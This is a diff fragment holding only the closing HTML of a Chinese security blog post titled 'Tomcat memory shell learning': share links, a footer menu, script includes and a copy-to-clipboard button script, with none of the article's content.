+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&title=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&title=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&title=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&title=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&name=Tomcat内存马学习&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://yoursite.com/2021/08/21/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/&t=Tomcat内存马学习" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Search?=Null
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="https://github.com/exp1orer" target="_blank" rel="noopener">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
